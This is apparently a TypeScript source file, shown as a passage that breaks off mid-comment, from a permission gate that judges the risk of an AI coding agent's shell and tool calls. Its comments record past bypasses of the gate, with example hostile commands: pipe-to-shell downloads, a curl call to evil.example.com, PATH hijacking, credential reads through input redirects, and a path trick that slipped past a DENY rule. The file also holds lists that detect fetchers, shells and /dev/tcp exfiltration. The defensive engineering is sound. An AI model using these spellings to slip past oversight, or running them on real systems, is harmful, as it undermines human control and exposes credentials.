/**
 * Turning a tool call into judged actions.
 *
 * This is the seam between the mechanical layers (parse, resolve paths) and the
 * opinionated one (the knowledge base). It is also where a single tool call
 * becomes several actions: `npm test && git push --force` is two things a
 * human would answer differently, so we judge them separately and let the worst
 * one drive the verdict.
 */

import type {
  Action,
  ActionKind,
  BlastRadius,
  Capability,
  Request,
  Target,
} from './types.js';
import { NIL_BLAST } from './types.js';
import { parseShell } from './shell/parse.js';
import { effectiveCommands, baseName, type EffectiveCommand } from './shell/unwrap.js';
import { UNRESOLVED } from './shell/tokenize.js';
import {
  canonicalize,
  candidatesOf,
  canonicalRoots,
  inWorkspace as pathInWorkspace,
  isUnplaceable,
  looksLikePath,
  displayPath,
  namedPath,
  unplaceable,
  type CanonicalPath,
} from './paths.js';
import { classifySecretPath, credentialTreeRoot, redact, secretSubstrings } from './secrets.js';
import { assignmentSignature, commandSignature, mcpArgSignature, normalizeArg, toolSignature, type SignatureCtx } from './signature.js';
import { toBlast, type Judgement, type KnowledgeCtx, type ProgramKnowledge } from './knowledge/types.js';
import { coreutils } from './knowledge/coreutils.js';
import { vcs } from './knowledge/vcs.js';
import { packages } from './knowledge/packages.js';
import { cloud } from './knowledge/cloud.js';
import { runtime } from './knowledge/runtime.js';
import { network } from './knowledge/network.js';

// Knowledge modules are registered here. Adding a family is one import and one
// array entry; nothing else in the codebase needs to know about it.
//
// Order matters only for overlaps: later entries win, so the specialised
// modules are listed after coreutils (which claims a few names, like `find` and
// `env`, that others also reason about).
const MODULES: ProgramKnowledge[] = [coreutils, vcs, packages, cloud, runtime, network];

/** Register an additional knowledge module (used by tests and by plugins). */
export function registerKnowledge(mod: ProgramKnowledge): void {
  MODULES.push(mod);
  index = null;
}

let index: Map<string, ProgramKnowledge> | null = null;

function lookup(program: string): ProgramKnowledge | undefined {
  if (!index) {
    index = new Map();
    // Later registrations win, so a plugin can override a built-in.
    for (const m of MODULES) for (const n of m.names) index.set(n, m);
  }
  return index.get(program);
}

export interface AnalyzeCtx {
  /** Canonical workspace roots. The first is the project root. */
  roots: string[];
  /** Extra secret path patterns from config. */
  secretPatterns: string[];
}

export interface Analysis {
  actions: Action[];
  /** True when every part of the request was accounted for. */
  understood: boolean;
  /** Wrapper tags seen anywhere in the request. */
  wrapperTags: string[];
  /** True when something executes content fetched in the same pipeline. */
  pipedFromNetwork: boolean;
  /** Parser notes, already redacted. */
  issues: string[];
}

/**
 * Leading verbs in MCP tool names that indicate a read.
 *
 * The convention is strong enough to be useful (`get_issue`, `list_files`,
 * `search_docs`) and weak enough that we only let it lower the judgement to
 * tier 2, which still requires a human to approve before it stops asking.
 */
const MCP_READ_VERBS = new Set([
  'get', 'list', 'read', 'search', 'find', 'fetch', 'query', 'describe', 'show',
  'view', 'preview', 'inspect', 'check', 'count', 'lookup', 'resolve', 'browse',
  'screenshot', 'snapshot', 'logs', 'log', 'status', 'stat', 'diff', 'watch',
  'has', 'is', 'ping', 'health', 'about', 'help', 'schema', 'introspect',
]);

/** Verbs that mean "run something" — worse than a write, because unbounded. */
const MCP_EXEC_VERBS = new Set([
  'exec', 'execute', 'eval', 'run', 'invoke', 'call', 'shell', 'command',
  'spawn', 'launch', 'start', 'script', 'compile', 'build',
]);

const NETWORK_FETCHERS = new Set(['curl', 'wget', 'aria2c', 'http', 'https', 'fetch']);
const SHELLS = new Set(['sh', 'bash', 'zsh', 'dash', 'ksh', 'ash', 'busybox', 'python', 'python3', 'node', 'perl', 'ruby']);

/**
 * Strip credential shapes from everything an action carries outward.
 *
 * `display` was redacted at the point it was built; `signature` was not, and
 * the signature is the field that gets *stored*. `--password=hunter2` and
 * `AWS_SECRET_ACCESS_KEY=wJal...` both survive templating, because a short
 * argument with no whitespace looks exactly like the identifier that ought to
 * be kept verbatim. So the secret landed in the envelope, in the session file,
 * and — worst — in `denials.jsonl`, which is append-only and by design never
 * pruned or decayed, so it outlived every other copy.
 *
 * Redacting here rather than at each of the places a signature is assembled is
 * deliberate: those are many and will grow, and the property wanted is about
 * the boundary, not about any one of them. A credential-shaped substring must
 * not leave `analyze()`.
 *
 * It costs nothing in precision. Two different passwords to the same command
 * were never usefully different learned identities; collapsing them to one
 * marker is the behaviour you would want anyway.
 */
function scrub(a: Action, secrets: string[]): Action {
  let signature = redact(a.signature);
  let display = redact(a.display);
  // Then remove anything the redactor identified in the *original* text.
  // Templating reorders argv, so `mysql -p hunter2` becomes a signature where
  // `-p` and `hunter2` are no longer adjacent and no pattern can find them.
  for (const secret of secrets) {
    signature = replaceOutsideTokens(signature, secret);
    if (display.includes(secret)) display = display.split(secret).join('«redacted»');
  }
  if (signature === a.signature && display === a.display) return a;
  return { ...a, signature, display };
}

/**
 * Replace a secret everywhere in a signature EXCEPT inside a `<…>` token.
 *
 * The signature is half structure and half surviving text, and only the second
 * half can contain a secret. A `<…>` token is something the templater derived —
 * `<path:secret>`, `<url:api.github.com>`, `<n>` — and blanking part of one
 * destroys a distinction the identity depends on.
 *
 * Which is not hypothetical. `curl -u bob:evil.example.com https://evil.example.com/p`
 * makes the captured password equal to the hostname, so removing every literal
 * occurrence turned `<url:evil.example.com>` into `<url:«redacted»>`. Every host
 * spelled that way collapsed onto one signature, and eleven approvals of a host
 * the developer trusted auto-approved a request to any other — the attacker
 * choosing their own password to make it happen.
 *
 * Safe because a token's contents are categories and hostnames, not
 * credentials: the URL templater keeps the host and discards everything else,
 * and a host is not a secret. `display` still gets the blanket treatment, since
 * it is prose shown to a human rather than an identity anything is keyed on.
 */
function replaceOutsideTokens(signature: string, secret: string): string {
  if (!secret || !signature.includes(secret)) return signature;
  let out = '';
  let i = 0;
  while (i < signature.length) {
    const open = signature.indexOf('<', i);
    if (open === -1) {
      out += signature.slice(i).split(secret).join('«redacted»');
      break;
    }
    const close = signature.indexOf('>', open);
    if (close === -1) {
      out += signature.slice(i).split(secret).join('«redacted»');
      break;
    }
    out += signature.slice(i, open).split(secret).join('«redacted»');
    out += signature.slice(open, close + 1);
    i = close + 1;
  }
  return out;
}

/**
 * Wrapper kinds whose opacity means "something else will run", as opposed to
 * "we have not read this project file". Only the second is waivable.
 */
const INJECTS_EXECUTION = new Set(['shell-eval', 'env', 'git-config', 'privilege', 'deferred', 'dynamic']);

/**
 * Collapse a path with two plausible resolutions down to the riskier one.
 *
 * `canonicalize` returns a second candidate when `..` was applied across a
 * symlink, because the physical rule (POSIX kernels, `realpath`) and the
 * lexical rule (Win32, `path.resolve`, Python's `abspath`) genuinely disagree
 * there — and which one applies depends on the platform *and* on which library
 * the command happens to call. There is no correct single answer to pick.
 *
 * So rather than guessing, the ambiguity is resolved towards caution: a
 * credential reading beats an outside reading beats an inside one. Everything
 * downstream keeps taking a single string, which matters — the containment and
 * secret checks are spread across a dozen knowledge modules, and a rule applied
 * in one place is a rule that cannot be forgotten in another.
 *
 * The cost is confined to paths that actually cross a symlink with a `..`. An
 * ordinary `src/../src/a.ts` has one candidate and is unaffected.
 */
function riskiest(c: CanonicalPath, roots: string[], secretPatterns: string[]): string {
  const best = pick(c, roots, secretPatterns);
  // `c.unknown` means at least one reading of this input could not be computed,
  // and there is no honest way to call something contained when we do not know
  // where it is. This is the single funnel every consumer goes through, which
  // is why the rule lives here rather than in the dozen knowledge modules —
  // exactly the argument the comment above makes for collapsing to one string.
  //
  // The best reading is carried along inside the marker rather than dropped.
  // "I do not know where this is" and "there is no path here" used to be the
  // same value, and every consumer read that value as the second one.
  return c.unknown ? unplaceable(best || c.named || c.raw) : best;
}

function pick(c: CanonicalPath, roots: string[], secretPatterns: string[]): string {
  const cands = candidatesOf(c);
  if (cands.length < 2) return cands[0] ?? '';
  const secret = cands.find((a) => classifySecretPath(a, secretPatterns).secret);
  if (secret) return secret;
  const outside = cands.find((a) => !pathInWorkspace(a, roots));
  if (outside) return outside;
  return cands[0] as string;
}

/** Analyse one request into actions. */
export function analyze(req: Request, ctx: AnalyzeCtx): Analysis {
  const out = analyzeRaw(req, ctx);
  // The original text, where a credential still has the context that makes it
  // recognisable. Structured tools carry theirs in the input object.
  let raw = safeString(req.input['command']);
  // `UNRESOLVED` here means the command was not a string at all, so there is no
  // original text to scan — fall back to the whole input, the same as for a
  // structured tool. Without this the scrubber would search the one-character
  // marker and miss a credential sitting in the payload.
  if (!raw || raw === UNRESOLVED) {
    try {
      raw = JSON.stringify(req.input) ?? '';
    } catch {
      raw = '';
    }
  }
  const secrets = secretSubstrings(raw);
  out.actions = out.actions.map((a) => scrub(settleTargets(a), secrets));
  out.understood = out.understood && out.actions.every((a) => a.understood);
  return out;
}

/** The note an action carries when one of its paths could not be placed. */
const UNPLACED_NOTE = 'LeastGrant could not work out which file this names';

/**
 * The last word on a path that could not be placed.
 *
 * Everything upstream carries one as a marked string, so that a knowledge
 * module which only ever sees `resolve()`'s return value cannot mistake it for
 * an ordinary location. That representation has to stop here, because the
 * floors in `guards.ts` match on the *name* — `isInside(t.value, stateDir)`,
 * `isControlFile(t.value)`, `isPersistence(t.value)` — and a marked string
 * matches none of them.
 *
 * Two things happen, and both are load-bearing:
 *
 *  1. **The target keeps the name and loses the location.** `value` is the best
 *     reading, so the name-matching floors have something to match;
 *     `inWorkspace` is false, because we do not know. Emitting no target at all
 *     — which is what an empty `abs` used to produce — turned every one of
 *     those floors off simultaneously, and that is how
 *     `C:\pagefile.sys\..\..\<stateDir>\config.json` got past the one DENY in
 *     the system and set the posture to `observe`.
 *  2. **The action stops being understood.** That is simply true, and it is
 *     what makes the identity unpromotable: `guard.not-understood` is an ask
 *     floor, and step 4 of `decideOne` returns before any amount of learned
 *     evidence is consulted. Without it, every unplaceable path shared one
 *     signature, so approvals of a harmless one paid for a credential read
 *     spelled the same way.
 *
 * Autopilot does waive `guard.not-understood`, but only for an action that is
 * `containedInProject`, and an unplaceable target is never in the project — so
 * the waiver cannot reach this.
 */
function settleTargets(a: Action): Action {
  if (!a.targets.some((t) => t.type === 'path' && isUnplaceable(t.value))) return a;
  const targets: Target[] = a.targets.map((t) =>
    t.type === 'path' && isUnplaceable(t.value)
      ? { ...t, value: namedPath(t.value), inWorkspace: false }
      : t,
  );
  return {
    ...a,
    targets,
    understood: false,
    notes: a.notes.includes(UNPLACED_NOTE) ? a.notes : [...a.notes, UNPLACED_NOTE],
  };
}

function analyzeRaw(req: Request, ctx: AnalyzeCtx): Analysis {
  // Containment roots must be canonical before anything is compared against
  // them; see canonicalDir() for why an un-expanded root silently classifies
  // every file in the project as "outside" it.
  const roots = canonicalRoots(ctx.roots.length ? ctx.roots : [req.cwd]);
  ctx = { ...ctx, roots };
  const root = roots[0] ?? req.cwd;

  // The same resolution rules the shell path uses. They used to be spelled out
  // twice, and the copy here was the one missing the unplaceable fallback — so
  // `Read`, `Write`, `Edit` and `Grep` received a bare empty string for a path
  // they could not place, and `analyzeStructured` turned that into an action
  // with no targets at all. One definition, so there is nowhere for the two to
  // drift apart again.
  const { kctx, sctx } = contextFor(req.cwd, roots, ctx.secretPatterns);

  const kind = normalizeTool(req.tool);

  if (kind === 'shell') {
    const command = safeString(req.input['command']);
    const analysis = analyzeShell(command, req, ctx, kctx, sctx, root);
    // A flag on the tool call, not in the command string, that removes the
    // agent's own sandbox. Training on the sandboxed form must not cover the
    // unsandboxed one, so it joins the signature — and it is never learnable,
    // because opting out of a sandbox is a decision, not a habit.
    if (req.input['dangerouslyDisableSandbox'] === true) {
      analysis.actions = analysis.actions.map((a) => ({
        ...a,
        signature: 'unsandboxed ' + a.signature,
        understood: false,
        blast: { ...a.blast, reach: worseReach(a.blast.reach, 'machine') },
        notes: ['this runs with the agent\'s own sandbox switched off', ...a.notes],
      }));
      analysis.understood = false;
    }
    return analysis;
  }

  const action = analyzeStructured(kind, req, kctx, sctx, root);
  return {
    actions: [action],
    understood: action.understood,
    wrapperTags: [],
    pipedFromNetwork: false,
    issues: [],
  };
}

// ---------------------------------------------------------------------------
// Shell
// ---------------------------------------------------------------------------

function analyzeShell(
  command: string,
  req: Request,
  ctx: AnalyzeCtx,
  kctx: KnowledgeCtx,
  sctx: SignatureCtx,
  root: string,
): Analysis {
  const env = { ...process.env, PWD: req.cwd } as Record<string, string | undefined>;
  const home = env['HOME'] ?? env['USERPROFILE'] ?? '';
  const parsed = parseShell(command, { env, home });
  const effs = effectiveCommands(parsed.commands, { env, home });

  const wrapperTags: string[] = [];
  for (const e of effs) for (const w of e.wrappers) if (!wrapperTags.includes(w.tag)) wrapperTags.push(w.tag);

  // Executing fetched content: a shell or interpreter downstream of a fetcher
  // in the same pipeline. `curl x | sh` is the canonical form, but
  // `wget -O - x | python` is the same thing.
  //
  // Scanned over `effs`, not over `parsed.commands`. The top-level parse of
  // `bash -c "curl http://x.sh | sh"` is a single `bash`, so the fetcher and
  // the shell it feeds were both invisible here and the download-and-execute
  // lost `guard.pipe-to-shell` and its `irreversible` reversibility — which on
  // Codex's unattended modes is the difference between a deny and no gate at
  // all. The effective inventory is where both commands actually are, and it
  // also sees through the wrappers on either end: `sudo curl x | sh` and
  // `curl x | sudo sh` were missed for the same reason.
  let pipedFromNetwork = false;
  for (let i = 0; i < effs.length; i++) {
    const c = effs[i]!.command;
    if (!c.contexts.includes('pipe')) continue;
    if (!SHELLS.has(baseName(c.name))) continue;
    for (let j = i - 1; j >= 0; j--) {
      const prev = effs[j]!.command;
      if (NETWORK_FETCHERS.has(baseName(prev.name))) {
        pipedFromNetwork = true;
        break;
      }
      if (!prev.contexts.includes('pipe')) break;
    }
  }

  // Resolve each command against the working directory it will actually run in.
  //
  // `cd` is not a no-op for path analysis: after `cd ~`, a bare `.bashrc` is the
  // shell profile, not a project file. Tracking it is the difference between
  // reporting a workspace read and reporting what really happens.
  const actions: Action[] = [];
  let shellCwd = req.cwd;
  let cwdKnown = true;

  for (const eff of effs) {
    const cmdCtx = cwdKnown
      ? contextFor(shellCwd, ctx.roots, ctx.secretPatterns)
      : unknownCwdContext(ctx.roots, ctx.secretPatterns);
    actions.push(buildShellAction(eff, cmdCtx.kctx, cmdCtx.sctx, root, pipedFromNetwork));

    // Apply the effect of this command on the working directory, for the next.
    const name = baseName(eff.command.name);
    if (name !== 'cd' && name !== 'pushd') continue;

    if (eff.command.contexts.includes('subshell') || eff.command.contexts.includes('procsubst')) {
      // A `cd` inside `( ... )` does not outlive the subshell, and we do not
      // model that scope. Rather than guess in either direction, stop claiming
      // to know where we are.
      cwdKnown = false;
      continue;
    }
    const arg = eff.command.argv.slice(1).find((a) => !a.startsWith('-'));
    if (arg === undefined) {
      // Bare `cd` goes home.
      const home = env['HOME'] ?? env['USERPROFILE'] ?? '';
      if (home) shellCwd = home;
      else cwdKnown = false;
      continue;
    }
    if (arg === '-' || arg.includes(UNRESOLVED)) {
      cwdKnown = false;
      continue;
    }
    const c = canonicalize(arg, shellCwd);
    // An ambiguous `cd` — one that crossed a symlink with a `..`, or one whose
    // walk we were refused — has more than one possible destination, and every
    // relative path after it would be resolved against a guess. Losing track is
    // the honest outcome. `c.unknown` has to be tested as well as `c.alt`,
    // because a refused walk now keeps its lexical reading in `abs`: taking
    // that as the new working directory would place every later path in the
    // command against a directory we were not able to confirm.
    if (c.unknown || (c.alt && c.alt !== c.abs)) cwdKnown = false;
    else if (c.abs) shellCwd = c.abs;
    else cwdKnown = false;
  }


  if (!actions.length) {
    actions.push({
      kind: 'meta',
      capability: 'meta',
      signature: '(no command)',
      display: redact(command.slice(0, 120)),
      blast: NIL_BLAST,
      targets: [],
      understood: parsed.ok,
      notes: [],
    });
  }

  const understood = parsed.ok && actions.every((a) => a.understood);
  return {
    actions,
    understood,
    wrapperTags,
    pipedFromNetwork,
    issues: parsed.issues.map(redact),
  };
}

/**
 * What a resolution failure resolves to.
 *
 * Returning an empty string was the single most dangerous default in the
 * engine. Knowledge modules are written as
 * `const abs = ctx.resolve(a); if (!abs) continue;` — so an unresolvable path
 * contributed *nothing*, and the module fell through to its benign case. A read
 * of `"$SECRET"`, or of a relative path after a `cd` we could not follow,
 * therefore came out as `fs.read.workspace`: the most permissive answer
 * available, produced by the absence of information.
 *
 * So an unplaceable path resolves to the `UNPLACEABLE` marker in `paths.ts`
 * instead. It is not a real location and never touches the filesystem; it
 * carries the best reading of the name, and it exists so that "I do not know
 * where this is" reads as "not in your project", which is the honest answer and
 * the safe one.
 *
 * The marker lives in `paths.ts` rather than here because the floors need it
 * too: a target has to keep its *name* for `guard.self-write`,
 * `guard.agent-config` and `guard.persistence` to have anything to match, and
 * dropping the target instead is what silenced all three at once.
 */
function contextFor(
  cwd: string,
  roots: string[],
  secretPatterns: string[],
): { kctx: KnowledgeCtx; sctx: SignatureCtx } {
  return resolutionContext(cwd, roots, secretPatterns, (arg) =>
    riskiest(canonicalize(arg, cwd), roots, secretPatterns),
  );
}

/**
 * The context used once we have lost track of the working directory.
 *
 * A relative path can no longer be placed, so it comes back unplaceable — which
 * reads as outside the project, is still name-matched for credentials, and is
 * never learnable. Absolute paths still resolve normally, since they do not
 * depend on where we are.
 */
function unknownCwdContext(
  roots: string[],
  secretPatterns: string[],
): { kctx: KnowledgeCtx; sctx: SignatureCtx } {
  return resolutionContext('', roots, secretPatterns, (arg) => {
    // An absolute path does not depend on where we are, so it still resolves.
    // A relative one cannot be placed at all, and must not read as contained.
    const looksAbsolute = /^([A-Za-z]:[\\/]|[\\/]|~)/.test(arg);
    return looksAbsolute ? riskiest(canonicalize(arg, roots[0] ?? ''), roots, secretPatterns) : '';
  });
}

/**
 * A resolution context rooted at a specific working directory.
 * Built per command, because `cd` moves it.
 *
 * The three rules for a path we could not place, in the order they matter:
 *
 *  - **Location: unknown, therefore outside.** `inWorkspace` is false. This is
 *    the one thing the first version of this already had right.
 *  - **Name: still a name.** `classifySecretPath` is a test on the *shape* of a
 *    path — `.ssh/id_rsa` names a private key wherever it turns out to live —
 *    so it is applied to the reading we have rather than skipped. Skipping it
 *    is what let a credential read spelled through an unreadable component
 *    inherit the signature, the approvals and the empty floor set of an
 *    ordinary read of `~/Documents/notes.txt`.
 *  - **Understood: no.** `settleTargets` marks any action holding one of these
 *    as not understood, which is honest and is what makes the identity
 *    unpromotable however often it is approved.
 */
function resolutionContext(
  cwd: string,
  roots: string[],
  secretPatterns: string[],
  place: (arg: string) => string,
): { kctx: KnowledgeCtx; sctx: SignatureCtx } {
  const resolve = (arg: string): string => place(arg) || unplaceable(arg);
  const inWs = (abs: string): boolean => (isUnplaceable(abs) ? false : pathInWorkspace(abs, roots));
  const isSecret = (abs: string): boolean => classifySecretPath(namedPath(abs), secretPatterns).secret;
  const isCredentialTree = (abs: string): boolean => !inWs(abs) && credentialTreeRoot(namedPath(abs)).secret;
  return {
    kctx: { cwd, roots, resolve, inWorkspace: inWs, isSecret, isCredentialTree },
    sctx: { resolve, inWorkspace: inWs, isSecret, looksLikePath },
  };
}


function buildShellAction(
  eff: EffectiveCommand,
  kctx: KnowledgeCtx,
  sctx: SignatureCtx,
  root: string,
  pipedFromNetwork: boolean,
): Action {
  const cmd = eff.command;

  // A command with no program still does something.
  //
  // `PATH=/tmp/evil` decides what every later command in the shell resolves to,
  // and `X=1 > ~/.bashrc` truncates a startup file. Both used to be discarded
  // before they ever reached here, so `PATH=/tmp/evil; npm test` produced a
  // single action byte-identical to an honest `npm test` and spent its
  // approvals — while `PATH=/tmp/evil npm test`, the same shell effect one
  // space apart, was correctly refused.
  //
  // The judgement borrowed is `export`'s, deliberately. A bare assignment and
  // an exported one have the same consequence for whatever runs next, we cannot
  // tell from argv whether the name was already exported, and the rule for
  // which variables redirect execution already lives in exactly one place. The
  // display and the signature stay in the spelling the caller actually used.
  const assignmentOnly = !cmd.name && !cmd.argv.length && cmd.assignments.length > 0;
  const program = assignmentOnly ? 'export' : baseName(cmd.name);
  const argv = assignmentOnly
    ? ['export', ...cmd.assignments.map((a) => `${a.name}=${a.value}`)]
    : [program, ...cmd.argv.slice(1)];

  const mod = lookup(program);
  let j: Judgement | null = mod ? mod.classify(argv, kctx) : null;

  if (!j) {
    // An unrecognised program. We know nothing about what it does, which is
    // itself the answer: it can be asked about, never assumed.
    j = {
      capability: 'exec.unknown',
      opaque: true,
      note: `LeastGrant has no knowledge of ${program}`,
    };
  }

  // Wrapper tags override the inner judgement where the wrapper is the point:
  // `ssh host ls` is not a directory listing, it is a remote session.
  //
  // Every one of these only ever escalates. Assigning instead of taking the
  // worse value made a wrapper able to *soften* what it wrapped: `sudo` set
  // reversibility to `hard`, so `sudo rm -rf /tmp/x` and `sudo git push
  // --force` came back one step below `irreversible` and lost
  // `guard.irreversible` — a floor, not a tier nudge. Wrapping something in a
  // privilege escalation is not a reason to worry about it less. The same
  // applies to `ssh`, whose `external` is below `production`.
  for (const w of eff.wrappers) {
    if (w.tag === 'remote') {
      j = {
        ...j,
        capability: 'exec.remote',
        reach: worseReach(j.reach ?? 'workspace', 'external'),
        note: w.note,
      };
    } else if (w.tag === 'privilege') {
      j = {
        ...j,
        reach: worseReach(j.reach ?? 'workspace', 'machine'),
        reversibility: worseReversibility(j.reversibility ?? 'trivial', 'hard'),
      };
    } else if (w.tag === 'container' || w.tag === 'k8s') {
      j = { ...j, capability: 'exec.container', note: w.note };
    }
  }

  // Injected execution widens reach, whatever the inner command looked like.
  //
  // There are two very different reasons an action can be opaque, and the
  // difference decides whether autopilot may wave it through. `bash ./build.sh`
  // is opaque because we have not read a file *in the project* — that is the
  // one concession autopilot makes, deliberately. But `bash --rcfile /tmp/evil
  // -c ls`, `env -C /etc npm test` and `git -c core.hooksPath=… commit` are
  // opaque because something of the caller's choosing runs *as well as*, or
  // instead of, the command we could read. Those kept classifying as whatever
  // the inner command was — `ls`, project-local, no exposure — so autopilot's
  // "contained in the project" test said yes and the floor was waived.
  //
  // Correcting the reach rather than the waiver is deliberate: the reach was
  // simply wrong. We do not know what the injected code touches, and every
  // consumer — the tier, the floors, the waiver — should be working from that
  // rather than from the inner command's modest footprint.
  if (eff.opaque && eff.wrappers.some((w) => INJECTS_EXECUTION.has(w.tag))) {
    j = { ...j, reach: worseReach(j.reach ?? 'workspace', 'machine') };
  }

  const blast = toBlast(j);
  const targets = collectTargets(argv, j, kctx, root);

  // A judgement that says "this exposes credentials" but whose targets say no
  // path holds any leaves `guard.secret-read` with nothing to name, so it falls
  // back to "this reads something that holds credentials". That is the shape of
  // a recursive sweep — `grep -r pat ~` exposes `~/.ssh` without naming it — so
  // the directory the walk starts from is marked here, and the explanation can
  // point at it.
  if (blast.exposure === 'reads-secrets' && !targets.some((t) => t.secret)) {
    for (const t of targets) {
      if (t.type === 'path' && t.value && kctx.isCredentialTree(t.value)) t.secret = true;
    }
  }

  // Paths named by a wrapper we peeled — the tree `find` walks, for instance.
  for (const p of eff.wrapperPaths ?? []) {
    const abs = kctx.resolve(p);
    if (!abs || targets.some((t) => t.value === abs)) continue;
    targets.push({
      type: 'path',
      value: abs,
      inWorkspace: kctx.inWorkspace(abs),
      secret: kctx.isSecret(abs),
    });
  }

  // Where the action actually lands overrides where the knowledge module
  // assumed it would.
  //
  // A module answers "what does this program do", from the program's name and
  // its flags. It cannot always tell where the result goes: `tar --directory
  // /etc`, `7z -o/etc`, `git -C /elsewhere commit`, `curl --cookie-jar
  // ~/.bashrc` and `dd if=~/.ssh/id_rsa` all name their destination or source
  // in a flag, and all were classified as though they stayed in the project.
  //
  // The targets are ground truth, so they get the last word: a write whose
  // destination is outside the project is an outside write, and any action
  // touching a credential file reads credentials, whatever the module said.
  const touchesSecret = targets.some((t) => t.type === 'path' && t.secret);
  const touchesOutside = targets.some((t) => t.type === 'path' && t.inWorkspace === false);

  if (touchesSecret && blast.exposure === 'none') {
    blast.exposure = 'reads-secrets';
  }
  if (touchesOutside) {
    blast.reach = worseReach(blast.reach, 'machine');
    if (j.capability === 'fs.write.workspace') {
      j = { ...j, capability: 'fs.write.outside' };
    } else if (j.capability === 'fs.read.workspace') {
      j = { ...j, capability: 'fs.read.outside' };
    }
  }

  // Unknown arguments widen the blast radius rather than blinding us: we still
  // know `rm` deletes, we just no longer know where. Treat an unknown path
  // target as potentially anywhere.
  if (eff.argsUnknown && touchesPaths(j)) {
    blast.reach = worseReach(blast.reach, 'machine');
    blast.scale = blast.scale === 'single' ? 'many' : blast.scale;
  }
  if (cmd.contexts.includes('loop')) {
    blast.scale = 'sweeping';
  }
  if (pipedFromNetwork && SHELLS.has(program)) {
    blast.reversibility = 'irreversible';
    blast.reach = worseReach(blast.reach, 'machine');
    // Replace the unhelpful "no knowledge of sh" note: the interesting fact is
    // not that we do not recognise `sh`, it is that its input came off the wire.
    j = {
      ...j,
      note: `runs whatever the download returned, as a ${program} script`,
    };
  }

  // Redirects are writes the knowledge base never sees.
  //
  // Widening the blast radius is not enough on its own: the floors in guards.ts
  // are keyed on capability, so an action left as `exec.inspect` slips past the
  // persistence and write-outside checks however wide its radius is.
  // `echo hi > ~/.bashrc` was allowed for exactly that reason.
  let redirectWrite: '' | 'workspace' | 'outside' = '';
  let redirectRead = false;
  for (const r of cmd.redirects) {
    if (!r.isFile) continue;
    // `>` and `>>` write; `<` and `0<` read. Both name a file, and both used to
    // be filtered by `op.includes('>')`, which quietly dropped every input
    // redirect on the floor. That was a hole straight through the resolver:
    // `grep -n TODO < escape/../id_rsa` never resolved its target, so it never
    // reached the containment or credential checks, carried no targets, and was
    // classified as an ordinary project-local read with the signature
    // `grep TODO -n` — the same identity as `cat x | grep -n TODO`. Trained on
    // that, it was auto-approved while reading a credential from outside the
    // project. Every stdin-consuming filter was a vehicle: `cat`, `base64`,
    // `sort`, `tr`, `xxd`, `jq`, `openssl`.
    //
    // The two cases that looked handled were handled by accident: a space in
    // the path split it into an argv operand, which the ordinary target scan
    // then picked up. On a machine whose home directory has no space in it, the
    // regression test covering this passed vacuously.
    const isWrite = r.op.includes('>');
    // Only `<` and `N<` name a file to read. `<<` carries a delimiter, `<<<`
    // carries inline text, and `<&` duplicates a descriptor — resolving any of
    // those as a path turns a heredoc's `EOF` into a filename, and would put
    // the contents of a here-string through the path machinery.
    if (!isWrite && !/^\d*<$/.test(r.op)) continue;
    const abs = kctx.resolve(r.target);
    if (!abs) {
      if (isWrite) redirectWrite = 'outside';
      else redirectRead = true;
      continue;
    }
    const secret = kctx.isSecret(abs);
    const inside = kctx.inWorkspace(abs);
    targets.push({ type: 'path', value: abs, inWorkspace: inside, secret });
    if (!inside) blast.reach = worseReach(blast.reach, 'machine');
    if (secret) blast.exposure = 'reads-secrets';
    if (isWrite) {
      if (blast.reversibility === 'trivial') blast.reversibility = 'easy';
      if (!inside) redirectWrite = 'outside';
      else if (redirectWrite !== 'outside') redirectWrite = 'workspace';
    } else {
      // Reading a file into a command is a read of that file, whatever the
      // command would otherwise have been judged as.
      redirectRead = true;
      if (secret) {
        j = { ...j, capability: worseCapability(j.capability, 'secret.read') };
      } else if (!inside) {
        j = { ...j, capability: worseCapability(j.capability, 'fs.read.outside') };
      }
    }
  }
  if (redirectRead && blast.reach === 'none') blast.reach = 'workspace';
  if (redirectWrite && blast.reach !== 'external' && blast.reach !== 'production') {
    // Only ever escalate: a command that already reaches further must not be
    // softened because it also redirects somewhere harmless.
    j = {
      ...j,
      capability: worseCapability(
        j.capability,
        redirectWrite === 'outside' ? 'fs.write.outside' : 'fs.write.workspace',
      ),
    };
  }
  // `> /dev/tcp/host/port` is a network write dressed as a redirect.
  for (const r of cmd.redirects) {
    if (/^\/dev\/(tcp|udp)\//.test(r.target)) {
      blast.reach = 'network';
      blast.exposure = 'can-exfiltrate';
      targets.push({ type: 'host', value: r.target.split('/')[3] ?? 'unknown' });
    }
  }

  const understood = !eff.opaque && !j.opaque;
  const notes = [...eff.notes];
  if (j.note) notes.unshift(j.note);

  return {
    kind: kindFor(j.capability),
    capability: j.capability,
    // For an assignment-only command the assignments *are* the command, so they
    // are named once, by `assignmentSignature`, which keeps the variable name
    // and templates only the value — the same rule the inline prefix form uses.
    signature: assignmentOnly
      ? assignmentSignature(cmd.assignments, sctx).trimEnd() + redirectSignature(cmd.redirects, sctx)
      : assignmentSignature(cmd.assignments, sctx) +
        commandSignature(argv, sctx) +
        redirectSignature(cmd.redirects, sctx),
    display: redact(renderArgv(assignmentOnly ? argv.slice(1) : argv, root)),
    blast,
    targets,
    understood,
    notes: notes.map(redact),
  };
}

function touchesPaths(j: Judgement): boolean {
  return j.pathArgs !== 'none';
}

function collectTargets(argv: string[], j: Judgement, kctx: KnowledgeCtx, root: string): Target[] {
  const out: Target[] = [...(j.targets ?? [])];

  // `pathArgs: 'none'` means "the positional arguments are not paths" — it is
  // how `kubectl get pods` says that `pods` is a resource, not a file. It does
  // NOT mean the command touches no files, and treating it that way skipped the
  // flag scan below, which is where `curl -D ~/.bashrc` and `git -C /etc` name
  // theirs.
  const indices =
    j.pathArgs === 'none'
      ? []
      : Array.isArray(j.pathArgs)
        ? j.pathArgs
        : argv.map((_, i) => i).filter((i) => i > 0);

  const add = (candidate: string) => {
    if (!candidate || !looksLikePath(candidate)) return;
    const abs = kctx.resolve(candidate);
    if (!abs) return;
    if (out.some((t) => t.type === 'path' && t.value === abs)) return;
    out.push({
      type: 'path',
      value: abs,
      inWorkspace: kctx.inWorkspace(abs),
      secret: kctx.isSecret(abs),
    });
  };

  for (const i of indices) {
    const a = argv[i];
    if (!a || a.startsWith('-')) continue;
    // `key=value` operands: `dd if=~/.ssh/id_rsa of=/dev/sda`. The value is the
    // path; the whole token contains a slash and would otherwise be resolved as
    // one, producing a nonsense target like `<cwd>/if=~/.ssh/id_rsa`.
    const eq = a.indexOf('=');
    if (eq > 0 && /^[A-Za-z_][A-Za-z0-9_]*$/.test(a.slice(0, eq))) {
      add(a.slice(eq + 1));
      continue;
    }
    add(a);
  }

  // Flags name destinations too, and only positional arguments were being
